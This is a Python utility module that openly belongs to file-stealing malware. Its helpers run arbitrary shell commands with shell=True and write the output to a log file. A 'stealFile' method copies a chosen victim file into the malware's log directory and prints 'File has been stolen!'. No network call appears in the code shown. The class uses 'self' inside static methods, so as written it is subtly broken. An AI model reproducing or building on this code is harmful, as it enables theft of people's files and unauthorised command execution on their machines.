from subprocess import check_output
from json import loads
from shutil import copy


class Util:
  
    @staticmethod
    def fileOut(file:str, data:str, mode='a') -> None:
        try:
            with open(file=file, mode=mode, encoding='UTF-8') as FILE:
                FILE.write(str(data))
        except Exception:
            print('fileOut Error!')


    @staticmethod
    def jsonIn(file) -> str:
        with open(file=file, mode='r') as FILE:
            return loads(FILE.readlines()[0])



    @staticmethod
    def executeShellCommand(command:str) -> str:
        result = ''
        try:
            result = check_output(command, shell=True, encoding='437')
        except Exception:
            result = 'Shell command execution failed!'
        return result



    @staticmethod
    def extractShellData(self, shellCommand:str):
        if shellCommand:
            result = Util.executeShellCommand(shellCommand)
            Util.fileOut(self.__config.logPath + 'shell.txt', result, 'w')
            print('Shell command executed!')



    @staticmethod
    def stealFile(self, stealPath:str):
        if stealPath:
            filename = stealPath.split('\\')[-1]
            copy(stealPath, self.__config.logPath + filename)
            print('File has been stolen!')

